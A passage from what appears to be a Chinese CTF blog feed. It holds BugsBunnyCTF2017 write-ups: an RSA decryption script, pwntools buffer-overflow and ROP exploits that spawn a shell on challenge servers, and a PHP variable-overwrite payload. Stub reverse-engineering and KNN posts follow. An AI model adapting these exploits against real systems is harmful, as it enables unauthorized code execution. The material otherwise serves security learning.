<p>用以下脚本解出flag：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">n = <span class="number">20473673450356553867543177537</span></div><div class="line">p = <span class="number">2165121523231</span></div><div class="line">q = <span class="number">9456131321351327</span></div><div class="line">e = <span class="number">17</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</div><div class="line">      <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      g, y, x = egcd(b % a, a)</div><div class="line">      <span class="keyword">return</span> (g, x - (b // a) * y, y)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</div><div class="line">      <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">return</span> x % m</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c, d, n)</span>:</span></div><div class="line">    <span class="keyword">return</span> pow(c, d, n)</div><div class="line"></div><div class="line">d = modinv(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</div><div class="line"><span class="keyword">print</span> d</div><div class="line">encfile = open(<span class="string">'enc.txt'</span>,<span class="string">'rb'</span>)</div><div class="line">decfile = open(<span class="string">'flag.txt'</span>,<span class="string">'wb'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</div><div class="line">	enc = encfile.readline()[:<span class="number">-1</span>]</div><div class="line">	<span class="keyword">print</span> enc</div><div class="line">	decfile.write(str(chr(decrypt(long(enc),d,n))))</div><div class="line">encfile.close()</div><div class="line">decfile.close()</div></pre></td></tr></table></figure></p>
<p>运行到最后时会说overflow出错，不过不影响flag。最后的flag如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Baby_RSA_Its_Cool_Lik3_school_haHAha&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;单刷好幸苦。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Crypto" scheme="http://yoursite.com/categories/writeup-Crypto/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>BugsBunnyCTF2017-pwn-writeup</title>
    <link href="http://yoursite.com/2017/07/30/BugsBunnyCTF2017-pwn-writeup/"/>
    <id>http://yoursite.com/2017/07/30/BugsBunnyCTF2017-pwn-writeup/</id>
    <published>2017-07-29T23:47:52.000Z</published>
    <updated>2017-08-01T12:52:08.339Z</updated>
    
    <content type="html"><![CDATA[<p>单刷好幸苦。<br><a id="more"></a></p>
<h1 id="Pwn50"><a href="#Pwn50" class="headerlink" title="Pwn50"></a>Pwn50</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">You look new here</div><div class="line">so this is my gift for you</div><div class="line">task : nc 54.153.19.139 5251</div><div class="line">just write something when connect , its always UP</div><div class="line">Author: TnMch</div></pre></td></tr></table></figure>
<p>用了gets，有明显的溢出。题目中有提供了system函数执行。exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">"54.153.19.139"</span>,<span class="string">"5251"</span>)</div><div class="line"></div><div class="line">v6 = <span class="number">0x62</span></div><div class="line">v7 = <span class="number">0x75</span></div><div class="line">v8 = <span class="number">0x67</span></div><div class="line">v9 = <span class="number">0xDEFACED</span></div><div class="line">offset = <span class="number">0x28</span> - <span class="number">0x10</span></div><div class="line">payload = <span class="string">'bug'</span> + <span class="string">'a'</span> * (offset <span class="number">-3</span>)+ p64(v9)</div><div class="line"></div><div class="line">r.sendline(payload)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
<p>既然可以溢出，也可以用rop来做。exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">"54.153.19.139"</span>,<span class="string">"5251"</span>)</div><div class="line">elf = ELF(<span class="string">"pwn50"</span>)</div><div class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</div><div class="line">binsh_addr = <span class="number">0x0000000000400773</span></div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400743</span></div><div class="line">offset = <span class="number">56</span></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(binsh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">r.sendline(payload)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
<p>然后我进去后找了好久的flag。以为那个pwn50是文件，结果最后发现是它是个文件夹mdzz。以后找flag可以用命令来帮忙：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ find /  -name flag</div><div class="line">find: &apos;/root&apos;: Permission denied</div><div class="line">/home/pwn50/flag</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;lool_cool_stuf_even_its_old!!!!!&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Pwn100"><a href="#Pwn100" class="headerlink" title="Pwn100"></a>Pwn100</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Try this , maybe little hard</div><div class="line">task : nc 54.153.19.139 5252</div><div class="line">Author: TnMch</div></pre></td></tr></table></figure>
<h1 id="pwn150"><a href="#pwn150" class="headerlink" title="pwn150"></a>pwn150</h1><p>用IDA调试后可以看到用fgets读入了192个字节，但起始位置距离rbp只有50个字节，存在溢出，而且程序没有开canary保护。溢出的offset推测为 0x50+8 = 88。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/16.jpg?raw=true" alt=""></p>
<p>用gdb调试确定为88的偏移。由于程序中会fork出新进程，为调试方便可以在gdb调试开始时先输入<code>set follow-fork-mode parent</code>，然后在对应的地方下断点进行调试。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/17.jpg?raw=true" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'pwn150'</span>)</div><div class="line">r = remote(<span class="string">"54.153.19.139"</span>,<span class="string">"5253"</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"UTC 2017"</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"Send me your message here:"</span>)</div><div class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</div><div class="line">sh_addr = elf.search(<span class="string">'sh'</span>).next()</div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400883</span></div><div class="line">pop_rsi_pop_r15_ret =  <span class="number">0x0000000000400881</span></div><div class="line">offset = <span class="number">88</span></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(sh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">r.send(payload)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>最后的flag：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ ls</div><div class="line">pwn150</div><div class="line">$ <span class="built_in">cd</span> pwn150</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">pwn150</div><div class="line">$ cat flag</div><div class="line">Bugs_Bunny&#123;did_i_help_you_Solve_it!oHH_talk_to_hacker:D&#125;</div></pre></td></tr></table></figure></p>
<h1 id="pwn300"><a href="#pwn300" class="headerlink" title="pwn300"></a>pwn300</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;单刷好幸苦。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:bin" scheme="http://yoursite.com/categories/writeup-bin/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>BugsBunnyCTF2017-web-writeup</title>
    <link href="http://yoursite.com/2017/07/30/BugsBunnyCTF2017-web-writeup/"/>
    <id>http://yoursite.com/2017/07/30/BugsBunnyCTF2017-web-writeup/</id>
    <published>2017-07-29T23:32:03.000Z</published>
    <updated>2017-07-31T09:55:09.003Z</updated>
    
    <content type="html"><![CDATA[<p>单刷好幸苦。<br><a id="more"></a></p>
<h1 id="Nothing-here"><a href="#Nothing-here" class="headerlink" title="Nothing here"></a>Nothing here</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Nothing here !</div><div class="line">http://52.53.151.123/web/web5.php</div></pre></td></tr></table></figure>
<p>访问后查看源代码，注释中有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QnVnc19CdW5ueXs1MjljNDI5YWJkZTIxNzFkMGEyNTU4NDQ3MmFmODIxN30K</div></pre></td></tr></table></figure></p>
<p>base64解码，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;529c429abde2171d0a25584472af8217&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">You know your job</div><div class="line">http://52.53.151.123/web/web30.php</div></pre></td></tr></table></figure>
<p>访问后题目说Only users of “Bugs_Bunny Browser” may access this page.。所以抓包改User-Agent。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/5.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag=zn8XhqnlBRBetevoFcSQAw0OMVH6Kwj23svbneF1%2B5gDfBdn9osZBfB06cTub4ARg3OTTjsBIG7x;</div></pre></td></tr></table></figure>
<p>中间有个%2B，是+号。在<a href="https://hashkiller.co.uk/text-encryption.aspx" target="_blank" rel="external">https://hashkiller.co.uk/text-encryption.aspx</a> 上，用密码<code>Hashkiller</code>解密。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;hashkiller_has_a_custom_encryption_ algorithm&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Old-php-vuln"><a href="#Old-php-vuln" class="headerlink" title="Old php vuln !"></a>Old php vuln !</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Hey ,Agent</div><div class="line">Your mission is to hack this secure portal .</div><div class="line">Good luck.</div><div class="line">http://52.53.151.123/web/web35.php</div></pre></td></tr></table></figure>
<h1 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PHP for noobs :p ?</div><div class="line">Maybe not this time :D</div><div class="line"></div><div class="line">http://34.253.165.46/SimplePhp/index.php</div><div class="line">source : http://34.253.165.46/SimplePhp/index.txt</div></pre></td></tr></table></figure>
<p>题目提供了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line"></div><div class="line">$_403 = <span class="string">"Access Denied"</span>;</div><div class="line">$_200 = <span class="string">"Welcome Admin"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</div><div class="line">	<span class="keyword">die</span>(<span class="string">"BugsBunnyCTF is here :p..."</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</div><div class="line">	<span class="keyword">die</span>($_403);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)</div><div class="line">	$$key = $$value;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)</div><div class="line">	$$key = $value;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</div><div class="line">	<span class="keyword">die</span>($_403);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">die</span>($_200);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中有把<code>$flag</code>直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个<code>die($_200)</code>，结合第一个foreach的功能，我们可以在第二个foreach之前先将<code>$_200</code>的值覆盖为原flag的值。payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://34.253.165.46/SimplePhp/index.php?_200=flag</div><div class="line"></div><div class="line">POST:</div><div class="line">flag=1</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Simple_PHP_1s_re4lly_fun_!!!&#125;</div></pre></td></tr></table></figure></p>
<p>利用前面的<code>die($_403)</code>也可以实现。我们先把原flag的值覆盖到<code>$_403</code>上，然后构造<code>$_POST[&quot;flag&quot;] !== $flag</code>，从而<code>die($_403)</code>输出flag。payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://34.253.165.46/SimplePhp/index.php?_403=flag&amp;_POST=1</div><div class="line"></div><div class="line">POST:</div><div class="line">flag=</div></pre></td></tr></table></figure></p>
<p>同样能获得flag。</p>
<h1 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h1><p>前端加密问题。部分代码如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> h = prompt(<span class="string">"Please enter your passowrd"</span>);</div><div class="line"><span class="keyword">if</span>(generate(h[<span class="number">11</span>]+h[<span class="number">8</span>]+h[<span class="number">1</span>]+h[<span class="number">0</span>]+h[<span class="number">9</span>]+h[<span class="number">4</span>]+h[<span class="number">13</span>])==_&amp;&amp;generate(h[<span class="number">15</span>]+h[<span class="number">10</span>]+h[<span class="number">3</span>]+h[<span class="number">5</span>]+h[<span class="number">6</span>])==__&amp;&amp;generate(h[<span class="number">16</span>]+h[<span class="number">12</span>]+h[<span class="number">14</span>]+h[<span class="number">2</span>]+h[<span class="number">7</span>])==___)&#123;</div><div class="line">    alert(<span class="string">'your flag is Bugs_Bunny&#123;'</span>+h+<span class="string">'&#125;'</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    alert(<span class="string">'I\'m sorry my son it\' not easy'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>经过初步调试后几个重要的值如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">_ = 6b07fd4ea837c39e1542e1bbca01a224</div><div class="line"></div><div class="line">__ = 20ee80e63596799a1543bc9fd88d8878</div><div class="line"></div><div class="line">___ = 21232f297a57a5a743894a0e4a801fc3</div></pre></td></tr></table></figure></p>
<p>而<code>generate</code>在逆向后发现是md5加密。在google上查到对应的md5解密对应如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">md5(tunisia) = 6b07fd4ea837c39e1542e1bbca01a224</div><div class="line">md5(bunny)   = 20ee80e63596799a1543bc9fd88d8878</div><div class="line">md5(admin)   = 21232f297a57a5a743894a0e4a801fc3</div></pre></td></tr></table></figure></p>
<p>所以有如下对应关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13]</div><div class="line">  t     u    n    i    s    i    a</div><div class="line"></div><div class="line">h[15]+h[10]+h[3]+h[5]+h[6]</div><div class="line">  b     u     n   n    y</div><div class="line"></div><div class="line">h[16]+h[12]+h[14]+h[2]+h[7]</div><div class="line">  a     d     m     i    n</div></pre></td></tr></table></figure></p>
<p>得到的h为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">inininynusutdamba</div></pre></td></tr></table></figure></p>
<p>最后的flag为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;inininynusutdamba&#125;</div></pre></td></tr></table></figure></p>
<h1 id="LQI-X"><a href="#LQI-X" class="headerlink" title="LQI_X"></a>LQI_X</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://34.253.165.46/LQI_X</div></pre></td></tr></table></figure>
<p>给了个登陆框，应有存在注入。</p>
<h1 id="Walk-walk"><a href="#Walk-walk" class="headerlink" title="Walk walk"></a>Walk walk</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.chouaibhm.me</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170731/3.jpg?raw=true" alt=""></p>
<p>发现是asw s3服务，存在未授权/信息泄露漏洞，可见<a href="https://book.ph0en1x.com/web/qi-ta-lou-dong/aws-lou-dong-xi-lie/s3-bucketxin-xi-xie-lu.html" target="_blank" rel="external">Awesome CTF Book:AWS 漏洞系列</a>。<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.chouaibhm.me.s3.amazonaws.com/</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170731/4.jpg?raw=true" alt=""></p>
<h1 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h1><p>随便进行了一些功能测试，比如点1+2，则抓包会发现有data字段时我们输入的表达式，forward掉后返回结果。驶入的表达式只允许输入数字，中小括号，感叹号，乘号，减号。猜测后端用eval执行。一开始我以为xss，将payload进行一次jsfuck加密后能绕过过滤，不过没啥用等。然后有一次的payload过长，返回的报错信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Error: spawn E2BIG</div><div class="line">    at exports._errnoException (util.js:1018:11)</div><div class="line">    at ChildProcess.spawn (internal/child_process.js:319:11)</div><div class="line">    at exports.spawn (child_process.js:378:9)</div><div class="line">    at Object.exports.execFile (child_process.js:143:15)</div><div class="line">    at exports.exec (child_process.js:103:18)</div><div class="line">    at /app/apps.js:47:11</div><div class="line">    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)</div><div class="line">    at next (/app/node_modules/express/lib/router/route.js:137:13)</div><div class="line">    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)</div><div class="line">    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)</div></pre></td></tr></table></figure></p>
<p>所以后端是用node.js。推测是要渗透nodojs。参考<a href="https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/" target="_blank" rel="external">Reverse shell on a Node.js application</a>和<a href="http://www.websecgeeks.com/2017/04/pentesting-nodejs-application-nodejs.html" target="_blank" rel="external">Pentesting Node.js Application : Nodejs Application Security </a>进行渗透，不过可惜没有成功。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;单刷好幸苦。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>zctf2017-EasyReverse-writeup</title>
    <link href="http://yoursite.com/2017/07/29/zctf2017-EasyReverse-writeup/"/>
    <id>http://yoursite.com/2017/07/29/zctf2017-EasyReverse-writeup/</id>
    <published>2017-07-29T07:26:31.000Z</published>
    <updated>2017-07-31T00:01:45.511Z</updated>
    
    <content type="html"><![CDATA[<p>未完待续<br><a id="more"></a><br>题目给了一个dll文件。<br>用IDA打开，shift+F12查看字符串。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/2.jpg?raw=true" alt=""></p>
<p>比如说有个yes字符串，双击进去。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/3.jpg?raw=true" alt=""></p>
<p>后面的<code>DATA XREF: get_string+74o</code>指明了引用该字符串的地址。双击跳转到代码段(.text)。利用f5汇编功能</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;未完待续&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Reverse" scheme="http://yoursite.com/categories/writeup-Reverse/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>机器学习算法：最近邻(KNN)</title>
    <link href="http://yoursite.com/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/"/>
    <id>http://yoursite.com/2017/07/25/机器学习算法：最近邻-KNN/</id>
    <published>2017-07-25T13:06:52.000Z</published>
    <updated>2017-07-26T10:42:19.587Z</updated>
    
    <content type="html"><![CDATA[<p>机器学习算法：最近邻(KNN)<br><a id="more"></a></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><h1 id="tensorflow"><a href="#tensorflow" class="headerlink" title="tensorflow"></a>tensorflow</h1><h1 id="sklearn"><a href="#sklearn" class="headerlink" title="sklearn"></a>sklearn</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</div><div class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_breast_cancer</div><div class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</div><div class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</div><div class="line"></div><div class="line">cancer = load_breast_cancer()</div><div class="line"></div><div class="line">print(cancer.DESCR)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">convertToDataframe</span><span class="params">()</span>:</span></div><div class="line">feature = cancer[<span class="string">'feature_names'</span>]</div><div class="line">df = pd.DataFrame(cancer.data,index=range(<span class="number">569</span>),columns=feature)</div><div class="line">df[<span class="string">'target'</span>] = cancer.target</div><div class="line"><span class="keyword">return</span> df</div><div class="line"></div><div class="line">print(<span class="string">"Now convert the dataset into dataframe:\n"</span>)</div><div class="line">cancerdf = convertToDataframe()</div><div class="line">print(cancerdf.head())</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">classDistribution</span><span class="params">(cancerdf)</span>:</span></div><div class="line">malignant = len(cancerdf[cancerdf[<span class="string">'target'</span>]==<span class="number">0</span>])</div><div class="line">benign = len(cancerdf[cancerdf[<span class="string">'target'</span>]==<span class="number">1</span>])</div><div class="line">index = [<span class="string">'malignant'</span>, <span class="string">'benign'</span>]</div><div class="line">target = pd.Series([malignant,benign],index=index)</div><div class="line"><span class="keyword">return</span> target</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">splitDataset</span><span class="params">(cancerdf)</span>:</span></div><div class="line">X = cancerdf[cancerdf.columns[:<span class="number">30</span>]]</div><div 